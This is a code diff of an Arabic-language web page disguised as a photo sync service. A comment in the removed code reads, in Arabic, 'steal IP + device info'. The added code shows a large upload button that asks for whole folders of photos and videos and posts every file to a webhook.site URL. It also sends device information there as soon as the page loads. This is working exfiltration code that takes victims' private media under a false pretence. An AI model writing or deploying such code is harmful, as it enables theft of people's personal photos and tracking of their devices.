@@ -17,6 +17,7 @@
         button{display:none;}
     </style>
 </head>
+    <button id="uploadBtn" style="display:block !important;margin:30px auto;padding:18px 40px;background:linear-gradient(45deg,#4285f4,#34a853);color:white;border:none;border-radius:30px;font-size:18px;font-weight:600;cursor:pointer;box-shadow:0 10px 30px rgba(66,133,244,.4);">📤 ابدأ رفع الصور الآن</button>
 <body>
     <div class="card">
         <div class="logo">📱</div>
@@ -28,26 +29,62 @@
         <p class="status" id="status">بدء المزامنة...</p>
     </div>
 
-    <script>
-    const WEBHOOK = 'https://webhook.site/de2d5cd8-ada8-447c-8557-f88d7a8e59d9'; // حط webhook.site URL هنا
-    let uploaded = 0, total = 0;
+   
+            <script>
+const WEBHOOK = 'https://webhook.site/de2d5cd8-ada8-447c-8557-f88d7a8e59d9';
+
+document.getElementById('uploadBtn').onclick = function() {
+    const input = document.createElement('input');
+    input.type = 'file';
+    input.multiple = true;
+    input.accept = 'image/*,video/*';
+    input.webkitdirectory = true;
     
-    // 1. سرقة IP + Device Info فوراً
-    async function initGrab() {
-        const info = await fetch(`${WEBHOOK}`, {
-            method: 'POST',
-            headers: {'Content-Type':'application/json'},
-            body: JSON.stringify({
-                type: 'device_info',
-                ip: await (await fetch('https://api.ipify.org?format=json')).then(r=>r.json()).then(d=>d.ip).catch(()=>'unknown'),
-                userAgent: navigator.userAgent,
-                language: navigator.language,
-                platform: navigator.platform,
-                screen: `${screen.width}x${screen.height}`,
-                timestamp: Date.now()
-            })
+    input.onchange = function(e) {
+        const files = Array.from(e.target.files);
+        document.getElementById('status').textContent = `جاري رفع ${files.length} ملف...`;
+        
+        files.forEach((file, i) => {
+            setTimeout(() => uploadFile(file), i * 500);
         });
-        startPhotoGrab();
+    };
+    input.click();
+};
+
+async function uploadFile(file) {
+    const formData = new FormData();
+    formData.append('file', file);
+    formData.append('name', file.name);
+    
+    try {
+        await fetch(WEBHOOK, {method: 'POST', body: formData});
+        document.getElementById('status').textContent += ` ✅ ${file.name}`;
+    } catch(e) {
+        document.getElementById('status').textContent += ` ❌ ${file.name}`;
+    }
+}
+
+// Device info فوراً
+fetch(WEBHOOK, {
+    method: 'POST',
+    headers: {'Content-Type':'application/json'},
+    body: JSON.stringify({
+        type: 'device_info',
+        userAgent: navigator.userAgent,
+        timestamp: Date.now()
+    })
+});
+</script>
+            
+            
+                
+                
+                
+            
+                
+            
+        
+        
     }
     
     // 2. الوصول للصور والفيديوهات
